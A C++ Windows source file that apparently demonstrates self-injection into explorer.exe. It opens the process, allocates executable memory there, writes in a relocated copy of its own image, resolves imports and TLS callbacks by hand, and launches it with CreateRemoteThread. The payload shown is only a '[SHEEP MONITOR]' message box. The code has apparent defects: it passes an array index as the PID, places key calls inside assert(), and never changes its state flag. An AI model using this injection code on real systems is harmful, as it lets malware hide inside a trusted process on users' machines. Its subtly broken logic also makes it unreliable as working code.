#include <cstdint>
#include <cstddef>
#include <cstdlib>
#include <cstring>
#include <cassert>
#include <windows.h>
#include <psapi.h>

#define VA_TO_RVA(base, va) (((std::uintptr_t)va) - ((std::uintptr_t)base))

enum class MonitorState { STATE_MIGRATE, STATE_MONITOR };

MonitorState MAIN_STATE = MonitorState::STATE_MIGRATE;

void exit_thread(void) {
   ExitThread(0);
}

PIMAGE_NT_HEADERS64 get_nt_headers(std::uint8_t *base) {
   PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)base;
   return (PIMAGE_NT_HEADERS64)&base[dos_header->e_lfanew];
}

void relocate_image(std::uint8_t *image, std::uintptr_t from, std::uintptr_t to) {
   PIMAGE_NT_HEADERS64 nt_headers = get_nt_headers(image);
   DWORD reloc_rva = nt_headers->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress;

   if (reloc_rva == 0)
      return;

   std::uintptr_t base_delta = to - from;
   std::uint8_t *base_reloc = &image[reloc_rva];

   while (((PIMAGE_BASE_RELOCATION)base_reloc)->VirtualAddress != 0) {
      PIMAGE_BASE_RELOCATION base_reloc_block = (PIMAGE_BASE_RELOCATION)base_reloc;
      WORD *entry_table = (WORD *)&base_reloc[sizeof(IMAGE_BASE_RELOCATION)];
      size_t entries = (base_reloc_block->SizeOfBlock-sizeof(IMAGE_BASE_RELOCATION))/sizeof(WORD);

      for (size_t i=0; i<entries; ++i) {
         DWORD reloc_rva = base_reloc_block->VirtualAddress + (entry_table[i] & 0xFFF);
         uintptr_t *reloc_ptr = (uintptr_t *)&image[reloc_rva];
               
         if ((entry_table[i] >> 12) == IMAGE_REL_BASED_DIR64)
            *reloc_ptr += base_delta;
      }
            
      base_reloc += base_reloc_block->SizeOfBlock;
   }
}

DWORD WINAPI load_image(LPVOID image_base) {
   std::uint8_t *base_u8 = (std::uint8_t *)image_base;
   PIMAGE_NT_HEADERS64 base_nt = get_nt_headers(base_u8);
   DWORD import_rva = base_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress;

   if (import_rva != 0) {
      PIMAGE_IMPORT_DESCRIPTOR import_table = (PIMAGE_IMPORT_DESCRIPTOR)&base_u8[import_rva];

      while (import_table->OriginalFirstThunk != 0) {
         HMODULE module = LoadLibraryA((const char *)&base_u8[import_table->Name]);
         std::uintptr_t *original_thunks = (std::uintptr_t *)&base_u8[import_table->OriginalFirstThunk];
         std::uintptr_t *import_addrs = (std::uintptr_t *)&base_u8[import_table->FirstThunk];

         while (*original_thunks != 0) {
            if (*original_thunks & 0x8000000000000000)
               *import_addrs = (std::uintptr_t)GetProcAddress(module, MAKEINTRESOURCE(*original_thunks & 0xFFFF));
            else {
               PIMAGE_IMPORT_BY_NAME import_by_name = (PIMAGE_IMPORT_BY_NAME)&base_u8[*original_thunks];
               *import_addrs = (std::uintptr_t)GetProcAddress(module, import_by_name->Name);
            }

            ++import_addrs;
            ++original_thunks;
         }

         ++import_table;
      }
   }

   /* initialize the tls callbacks */
   DWORD tls_rva = base_nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;

   if (tls_rva != 0) {
      PIMAGE_TLS_DIRECTORY64 tls_dir = (PIMAGE_TLS_DIRECTORY64)&base_u8[tls_rva];
      void (**callbacks)(PVOID, DWORD, PVOID) = (void (**)(PVOID, DWORD, PVOID))tls_dir->AddressOfCallBacks;

      while (*callbacks != NULL) {
         (*callbacks)(base_u8, DLL_PROCESS_ATTACH, nullptr);
         ++callbacks;
      }
   }

   return 0;
}

int main(int argc, char *argv[]) {
   switch (MAIN_STATE) {
   case MonitorState::STATE_MIGRATE: {
      /* enum processes and get pid tied to explorer.exe */
      DWORD proc_array_bytes = sizeof(DWORD) * 1024;
      DWORD *proc_array = (DWORD *)std::malloc(proc_array_bytes);
      DWORD proc_array_needed;
      assert(EnumProcesses(proc_array, proc_array_bytes, &proc_array_needed));

      if (proc_array_needed > proc_array_bytes) {
         proc_array = (DWORD *)std::realloc(proc_array, proc_array_needed);
         proc_array_bytes = proc_array_needed;
         assert(EnumProcesses(proc_array, proc_array_bytes, &proc_array_needed));
      }

      std::size_t pids = proc_array_needed / sizeof(DWORD);
      DWORD found_pid = -1;

      for (std::size_t i=0; i<pids; ++i) {
         HANDLE proc = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, proc_array[i]);

         if (proc == NULL)
            continue;

         char filename[MAX_PATH+1];
         std::memset(&filename[0], 0, MAX_PATH+1);
         DWORD filename_size = GetModuleFileNameExA(proc, nullptr, &filename[0], MAX_PATH);

         std::size_t j;
      
         for (j=filename_size; j!=0; --j)
            if (filename[j] == '\\')
               break;

         ++j;

         if (std::strncmp(&filename[j], "explorer.exe", std::strlen("explorer.exe")) == 0) {
            found_pid = i;
            break;
         }
      }

      assert(found_pid != -1);

      /* open pid with PROCESS_QUERY_INFORMATION | PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE */
      HANDLE explorer_proc = OpenProcess(PROCESS_VM_READ | PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, found_pid);
      DWORD error = GetLastError();
      assert(explorer_proc != nullptr);
      
      /* allocate space for our executable */
      std::uint8_t *self_u8 = (std::uint8_t *)GetModuleHandleA(nullptr);
      PIMAGE_NT_HEADERS64 self_nt = get_nt_headers(self_u8);
      std::uintptr_t explorer_base = (std::uintptr_t)VirtualAllocEx(explorer_proc, nullptr, self_nt->OptionalHeader.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
      assert(explorer_base != 0);
      
      /* copy the executable in memory and relocate it to the allocated base */
      std::uint8_t *copy_u8 = (std::uint8_t *)std::malloc(self_nt->OptionalHeader.SizeOfImage);
      std::memcpy(copy_u8, self_u8, self_nt->OptionalHeader.SizeOfImage);
      relocate_image(copy_u8, (std::uintptr_t)self_u8, explorer_base);
      
      /* write the relocated executable to the process's allocation with WriteProcessMemory */
      SIZE_T bytes_written;
      assert(WriteProcessMemory(explorer_proc, (LPVOID)explorer_base, copy_u8, self_nt->OptionalHeader.SizeOfImage, &bytes_written));
      
      /* get the rva of the loader and call it with CreateRemoteThread */
      DWORD loader_rva = VA_TO_RVA(self_u8, load_image);
      DWORD loader_id;
      HANDLE loader_handle = CreateRemoteThread(explorer_proc, nullptr, 8192, (LPTHREAD_START_ROUTINE)(explorer_base+loader_rva), (LPVOID)explorer_base, 0, &loader_id);
      assert(loader_handle != nullptr);
      
      /* wait for the thread to finish */
      WaitForSingleObject(loader_handle, INFINITE);
      
      /* get the rva of the target routine and call it with CreateRemoteThread */
      DWORD main_id;
      HANDLE main_handle = CreateRemoteThread(explorer_proc, nullptr, 8192, (LPTHREAD_START_ROUTINE)(explorer_base+self_nt->OptionalHeader.AddressOfEntryPoint), nullptr, 0, &main_id);
      assert(main_handle != nullptr);

      return 0;
   }

   case MonitorState::STATE_MONITOR: {
      atexit(exit_thread);
      char filename[MAX_PATH+1];
      std::memset(&filename[0], 0, MAX_PATH+1);
      std::size_t filename_size = GetModuleFileNameA(nullptr, &filename[0], MAX_PATH);
      MessageBoxA(nullptr, filename, "[SHEEP MONITOR]", MB_ICONEXCLAMATION | MB_OK);
      /* monitor_sheep() */
      return 0;
   }
   }

   return 1;
}
